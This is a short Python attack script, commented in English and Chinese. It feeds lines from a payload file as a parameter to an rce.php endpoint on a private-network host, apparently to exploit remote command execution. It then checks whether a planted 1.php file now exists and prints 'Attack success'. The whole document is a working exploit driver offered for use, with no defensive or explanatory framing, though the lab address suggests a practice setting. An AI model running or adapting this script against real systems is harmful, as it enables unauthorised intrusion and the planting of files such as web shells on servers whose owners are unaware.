
#!/usr/bin/python
# -*- coding: UTF-8 -*-


import requests

url = "http://192.168.61.157/rce.php?1={0}"
print("[+]start attack!!!")
with open("payload.txt","r") as f:
	for i in f:
		print("[*]" + url.format(i.strip()))
		requests.get(url.format(i.strip()))

#检查是否攻击成功
test = requests.get("http://192.168.61.157/1.php")
if test.status_code == requests.codes.ok:
	print("[*]Attack success!!!")
